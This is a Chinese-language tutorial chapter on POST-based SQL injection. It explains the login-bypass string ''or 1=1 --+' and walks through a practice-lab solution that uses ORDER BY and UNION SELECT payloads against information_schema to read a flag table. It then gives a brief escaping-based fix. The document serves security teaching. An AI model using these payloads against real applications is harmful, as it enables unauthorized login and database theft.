# Chapter 3.2 - POST Injection

[TOC]

## 0x00 原理

### POST注入

>POST请求：向指定资源提交数据进行处理请求(例如提交表单或者上传文件)。数据被包含在请求体中。POST请求可能会导致新的资源的创建和/或已有资源的修改。

在HTML中，POST传参方式会将表单打包后隐藏在后台发送给服务器，通常是通过页面文本表单(Form)和文件上传表单和JSON表单、XML表单。

对应的标识和传参方式：

|        传参类型        |           传参编码标识            |                     传参方式                     |
| :--------------------: | :-------------------------------: | :----------------------------------------------: |
| FORM表单（**最常见**） | application/x-www-form-urlencoded |           与GET型相同，`属性名=参数名`           |
|      文件上传表单      |        multipart/form-data        | `------WebKitFormBoundaryXXXXXX`分割的结构化信息 |
|     JSON域/XML表单     |         application/json          |           按照JSON/XML调用规范编写传参           |

而POST注入和之前的GET显错注入相同，只是将注入点换为以上的传参类型指定的位置，用特定的传参方式进行传参。

### 万能密码

```mysql
万能密码：'or 1=1 --+
```

假设数据库中存放用户信息的表是**admin**，其中存放用户名的字段是**username**，存放密码的字段是**password**，在用户验证页面中用来接收用户所输入的用户名和密码的变量分别是**uname**和**pwd**，当用户在用户验证页面输入用户名和密码后，会提交给如下的语句进行处理：

```mysql
SELECT * FROM admin where `username`='$uname' and `password` = '$pwd'
```

而在输入万能密码后得到的语句：

```mysql
SELECT * FROM admin where `username`='XXX' and `password` = ''or 1=1 --+'
```

由此可知，在用户名和密码检索失败后会转入用户输入的语句`or 1=1`，

使where后的条件均为真，则可以绕过验证登陆。

## 0x01 靶场实战

1. 尝试万能密码登入，成功

2. 进行字段数的猜解`order by X -- qwe`，在顺次输入到输入order by 4后出现报错，说明该表只存在四个字段

3. 通过SQLi方法找出表名

   ``` mysql
   UNION SELECT 1,2,TABLE_NAME from information_schema.tables where table_schema=database() -- qwe 
   ```

4. 找出对应的字段名

   ```mysql
   UNION SELECT 1,2,column_name from information_schema.columns where table_schema=database() and table_name='flag' -- qwe 
   ```

5. 得到FLAG

   ```mysql
   UNION SELECT 1,2,flag from flag -- qwe
   ```

   

## 0x02 修复方法

1. 万能密码的修复方法

   通过PHP链接到数据库文件中添加转义语句将语句符号强制转换为字符串再传入数据库：

   ```php
   $user = mysql_real_escape_string($_POST[‘user’]);
   ```

2. 注入部分修复与上一章SQLi相同。

## 0x03 附加

1. POST传参大概率没有长度限制，相比GET注入来说攻击者可以上传更加危险的信息。
2. 使用Sqlmap进行自动检测漏洞时可以使用`--form`语句，使用`*`定位注入点。